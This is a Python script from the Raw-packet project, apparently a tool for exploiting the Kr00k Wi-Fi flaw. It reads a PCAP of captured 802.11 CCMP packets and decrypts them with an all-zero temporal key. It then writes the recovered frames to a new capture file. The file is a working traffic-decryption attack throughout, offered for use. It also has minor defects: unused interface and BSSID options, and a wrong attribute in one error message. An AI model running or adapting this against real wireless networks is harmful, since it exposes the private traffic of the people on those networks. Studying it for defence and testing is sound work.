#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
capture.py: Script for sniffing 802.11x authentication packets
Authors: Gleb Cherbov, Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Add project root path
from sys import path
from os.path import dirname, abspath, isfile
from scapy.all import rdpcap, wrpcap, Dot11CCMP
from Cryptodome.Cipher import AES
from argparse import ArgumentParser
from typing import Dict, Union
from re import sub
# endregion

# region Authorship information
__author__ = 'Gleb Cherbov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


# region Decrypt data
def decrypt(encrypted_data: bytes = b'',
            client_mac_address: str = '01234567890a',
            key_iv: str = '000000000002',
            qos: str = '00') -> Union[None, bytes]:
    """
    Decrypt with NULL key
    :param encrypted_data: Bytes of Encrypted data
    :param client_mac_address: Client MAC address (example: '01234567890a')
    :param key_iv: Key IV (default: '000000000002')
    :param qos: QoS (default: '00')
    :return: Bytes of Decrypted data or None if error
    """
    try:
        nonce: bytes = bytes.fromhex(qos) + \
                       bytes.fromhex(client_mac_address) + \
                       bytes.fromhex(key_iv)
        tk = bytes.fromhex("00000000000000000000000000000000")
        cipher = AES.new(tk, AES.MODE_CCM, nonce, mac_len=8)
        decrypted_data: bytes = cipher.decrypt(encrypted_data)
        assert decrypted_data.startswith(b'\xaa\xaa\x03'), 'Decrypt error, TK is not NULL'
        return decrypted_data

    except AssertionError:
        pass

    return None
# endregion


# region Analyze 802.11 packets
def analyze_packet(packet):
    try:
        assert packet.haslayer(Dot11CCMP), 'Is not 802.11 CCMP packet'

        pn0 = "{:02x}".format(packet.PN0)
        pn1 = "{:02x}".format(packet.PN1)
        pn2 = "{:02x}".format(packet.PN2)
        pn3 = "{:02x}".format(packet.PN3)
        pn4 = "{:02x}".format(packet.PN4)
        pn5 = "{:02x}".format(packet.PN5)

        addr2 = sub(':', '', packet.addr2)
        addr3 = sub(':', '', packet.addr3)

        plaintext = decrypt(encrypted_data=packet.data[:-8], client_mac_address=addr2,
                            key_iv=pn5 + pn4 + pn3 + pn2 + pn1 + pn0)
        assert plaintext is not None, 'Can not decrypt packet with NULL TK'

        base.print_success("Got a kr00ked packet!")

        packet_type = plaintext[6:8]
        ethernet_header = bytes.fromhex(addr3 + addr2) + packet_type
        out_packet = ethernet_header + plaintext[8:]
        wrpcap(args.pcap_path_result, out_packet, append=True)

    except IndexError:
        pass

    except AssertionError:
        pass
# endregion


# region Main function
if __name__ == '__main__':

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    from raw_packet.Utils.base import Base
    base: Base = Base()
    # endregion

    # region Variables
    variables: Dict[str, Union[int, str, bytes]] = dict()
    # endregion

    try:

        # region Check user and platform
        base.check_user()
        # base.check_platform()
        # endregion

        # region Parse script arguments
        parser: ArgumentParser = ArgumentParser(description='Checking network security mechanisms')
        parser.add_argument('-i', '--interface', help='Set interface name for listen packets', default=None)
        parser.add_argument('-b', '--bssid', help='Set WiFi AP BSSID', default=None)
        parser.add_argument('-c', '--client', help='Set WiFi client MAC address', default=None)
        parser.add_argument('-p', '--pcap_path_read', help='Set path to PCAP file for read encrypted packets',
                            default=None)
        parser.add_argument('-r', '--pcap_path_result', help='Set path to PCAP file for write decrypted packets',
                            default='kr00k.pcap')
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        args = parser.parse_args()
        # endregion

        # region Print banner
        if not args.quiet:
            base.print_banner()
        # endregion

        # region Check and read PCAP file
        if args.pcap_path_read is not None:
            assert isfile(args.pcap_path_read), 'Pcap file: ' + base.error_text(args.pcap_path) + ' not found!'
            encrypted_packets = rdpcap(args.pcap_path_read)

            for encrypted_packet in encrypted_packets:
                analyze_packet(packet=encrypted_packet)
        # endregion

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)
# endregion
